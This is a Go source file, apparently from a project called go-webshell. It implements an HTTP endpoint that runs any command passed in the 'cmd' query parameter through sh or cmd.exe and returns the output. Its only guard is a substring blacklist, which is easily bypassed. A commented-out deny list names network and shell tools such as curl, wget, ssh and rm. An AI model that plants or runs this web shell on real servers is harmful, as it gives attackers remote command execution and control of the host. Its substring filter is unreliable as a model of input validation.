package command

import (
	"database/sql"
	"github.com/alexperezortuno/go-webshell/internal/platform/storage/data_base"
	"github.com/gin-gonic/gin"
	"log"
	"net/http"
	"os/exec"
	"runtime"
	"strings"
)

func CmdHandler() gin.HandlerFunc {
	return func(ctx *gin.Context) {
		log.Printf("command to execute: %s", ctx.Query("cmd"))
		rowsCommands, err := data_base.GetBlackList()
		if err != nil {
			log.Printf("Error getting blacklist: %s", err)
			ctx.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}
		defer func(rows *sql.Rows) {
			err := rows.Close()
			if err != nil {
				log.Printf("Error closing rows: %s", err)
			}
		}(rowsCommands)

		forbiddenCommand := "forbidden command"
		var forbiddenCommands []string
		for rowsCommands.Next() {
			err := rowsCommands.Scan(&forbiddenCommand)
			if err != nil {
				log.Printf("Error scanning row: %s", err)
				ctx.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
				return
			}
			forbiddenCommands = append(forbiddenCommands, forbiddenCommand)
		}

		//forbiddenCommands := []string{"sudo",
		//	"shutdown", "whoami", "cd ", "reboot", "systemctl", "rm ", "rmdir ", "mkdir ", "touch ",
		//	"mv ", "cp ", "cat ", "less", "more", "head", "tail", "find", "grep", "awk", "sed",
		//	"sort ", "uniq", "wc", "diff", "patch", "tar ", "gzip ", "gunzip", "bzip2", "unzip", "zip ",
		//	"chown ", "chmod ", "chgrp ", "chattr ", "chcon ", "chroot ", "chvt", "chsh", "chfn", "chage ",
		//	"chpasswd", "vi", "vim", "nano", "emacs", "ged", "gedit", "kate", "kwrite", "kedit", "python ",
		//	"perl ", "ruby ", "php ", "java ", "javac ", "gcc ", "g++ ", "make ", "cmake ", "clang ", "clang++ ", "rustc ",
		//	"go ", "node ", "npm ", "yarn ", "pip ", "pip3 ", "pipenv ", "docker ", "docker-compose ", "docker-machine ",
		//	"docker-swarm ", "docker-credential ", "dockerd ", "docker-init ", "docker-proxy ", "docker-runc ", "dockerd ",
		//	"/.", "sh ", "ssh ", "scp ", "sftp ", "rsync ", "curl ", "wget ", "aria2c ", "aria2 ", "aria2c ", "aria2 ",
		//}

		for _, str := range forbiddenCommands {
			if strings.Contains(ctx.Query("cmd"), str) {
				ctx.JSON(http.StatusForbidden, gin.H{
					"code":    -2002,
					"message": forbiddenCommand,
				})
				return
			}
		}

		if ctx.Query("cmd") == "" {
			_, err := data_base.Insert(ctx, http.StatusBadRequest)
			if err != nil {
				log.Printf("error inserting command in database: %s", err)
			}

			ctx.JSON(http.StatusBadRequest, gin.H{
				"code":    -2000,
				"message": "command is empty",
			})
			return
		}

		commandOutput, err := execute(ctx.Request)

		if err != nil {
			ctx.JSON(http.StatusBadRequest, gin.H{
				"code":    -2001,
				"message": err.Error(),
			})
			return
		}

		_, err = data_base.Insert(ctx, http.StatusOK)
		if err != nil {
			log.Printf("error inserting command in database: %s", err)
		}

		rows, err := data_base.GetAll()
		if err != nil {
			log.Printf("error getting all commands from database: %s", err)
		}
		defer rows.Close()
		log.Printf("rows: %v", rows)
		for rows.Next() {
			var id int
			var header string
			var ip string
			var command string
			var status int
			var created_at string
			var updated_at string
			err = rows.Scan(&id, &ip, &header, &command, &status, &created_at, &updated_at)
			if err != nil {
				log.Printf("error scanning rows: %s", err)
			}
			log.Printf("id: %d, header: %s, ip: %s, command: %s, status: %d, created_at: %s, updated_at: %s", id, header, ip, command, status, created_at, updated_at)
		}

		ctx.JSON(http.StatusOK, gin.H{
			"code":    2000,
			"message": commandOutput,
		})
	}
}

func execute(r *http.Request) (string, error) {
	cmd := r.URL.Query().Get("cmd")
	var out []byte

	if runtime.GOOS == "windows" {
		sh := "cmd.exe"
		out, err := exec.Command(sh, "/K", cmd).Output()
		if err != nil {
			return "", err
		}

		return string(out), nil
	}

	sh := "sh"
	out, err := exec.Command(sh, "-c", cmd).Output()

	if err != nil {
		return "", err
	}

	return string(out), nil

	/*
		cmd = strings.Split(r.URL.Query("cmd"), " ")

		if len(cmd_str) > 1 {
			out, _ = exec.Command(cmd[0], cmd[1:]...).Output()
		} else {
			out, _ = exec.Command(cmd[0]).Output()
		}

		fmt.Printf("%s", out)

		return _, nil*/

	//cmd := exec.Command("bash")
	//log.Println(r.URL.Query().Get("cmd"))
	//cmd.Stdin = strings.NewReader(r.URL.Query().Get("cmd"))
	//cmd.Stderr = os.Stderr
	//stdout, err := cmd.StdoutPipe()
	//if err != nil {
	//	return out, err
	//}
	//
	//if err := cmd.Start(); err != nil {
	//	return out, err
	//}
	//
	//defer cmd.Wait()
	//
	//scanner := bufio.NewScanner(stdout)
	//for scanner.Scan() {
	//	cmd_str = append(cmd_str, scanner.Text())
	//	out = append(out, scanner.Bytes()...)
	//}
	//
	//if err := scanner.Err(); err != nil {
	//	return out, err
	//}
	//
	//fmt.Println(cmd_str)
	//
	//return out, nil
}
